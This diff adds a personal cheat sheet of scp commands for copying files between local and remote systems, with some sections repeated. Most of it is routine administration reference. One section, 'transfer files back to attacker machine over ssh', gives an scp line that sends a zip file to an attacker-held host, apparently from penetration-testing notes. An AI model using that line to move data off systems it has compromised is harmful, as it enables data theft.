@@ -1,1 +1,66 @@
+Copy a Local File to a Remote System with the scp Command
+scp file.txt remote_username@10.10.0.x:/remote/directory
+scp file.txt remote_username@10.10.0.x:/remote/directory/newfilename.txt   -  save the file under a different name, you need to specify the new file name
+scp -P 2322 file.txt remote_username@10.10.0.x:/remote/directory    - you can specify the port using the -P argument:
+scp -r /local/directory remote_username@10.10.0.x:/remote/directory   - To copy a directory from a local to remote system, use the -r option
 
+
+Copy a Remote File to a Local System using the scp Command 
+scp remote_username@10.10.0.x:/remote/file.txt /local/directory   - copy a file named file.txt from a remote server with IP 10.10.0.x
+
+Copy a File Between Two Remote Systems using the scp Command 
+scp user1@host1.com:/files/file.txt user2@host2.com:/files   - command will copy the file /files/file.txt from the remote host host1.com to the directory /files on the remote host host2.com
+
+To route the traffic through the machine on which the command is issued, use the -3 option:
+scp -3 user1@host1.com:/files/file.txt user2@host2.com:/files
+
+SCP
+SCP transfer files back to attacker machine over ssh
+$ scp filename.zip username@192.168.119.x:
+(don't forget the ':' )
+
+Basic Syntax
+$ scp source_file_path destination_file_path
+
+Uploading
+Single file
+$ scp ~/my_local_file.txt user@remote_host.com:/some/remote/directory
+
+Multiple files
+$ scp foo.txt bar.txt username@remotehost:/path/directory/
+
+Downloading
+Single file
+
+$ scp user@remote_host.com:/some/remote/directory ~/my_local_file.txt
+
+Multiple files
+$ scp username@remotehost:/path/directory/\{foo.txt,bar.txt\} .
+
+Extra Options
+Verbose Output
+$ scp -v source_file_path destination_file_path
+
+Copy Entire Directory (Recursively)
+$ scp -r source_file_path destination_file_path
+
+Copy a Local File to a Remote System with the scp Command
+scp file.txt remote_username@10.10.0.2:/remote/directory
+scp file.txt remote_username@10.10.0.2:/remote/directory/newfilename.txt   -  save the file under a different name, you need to specify the new file name
+scp -P 2322 file.txt remote_username@10.10.0.2:/remote/directory    - you can specify the port using the -P argument:
+scp -r /local/directory remote_username@10.10.0.2:/remote/directory   - To copy a directory from a local to remote system, use the -r option
+
+Copy a Remote File to a Local System using the scp Command 
+scp remote_username@10.10.0.x:/remote/file.txt /local/directory   - copy a file named file.txt from a remote server with IP 10.10.0.x
+
+Copy a File Between Two Remote Systems using the scp Command 
+scp user1@host1.com:/files/file.txt user2@host2.com:/files   - command will copy the file /files/file.txt from the remote host host1.com to the directory /files on the remote host host2.com
+
+To route the traffic through the machine on which the command is issued, use the -3 option:
+scp -3 user1@host1.com:/files/file.txt user2@host2.com:/files
+
+Copy a File Remotely over SSH: SCP tool is used to securely copy files over the SSH protocol.
+scp fileName user@remotehost:destinationPath
+
+Example:
+scp test.txt test@10.0.0.x:/home/john/Desktop
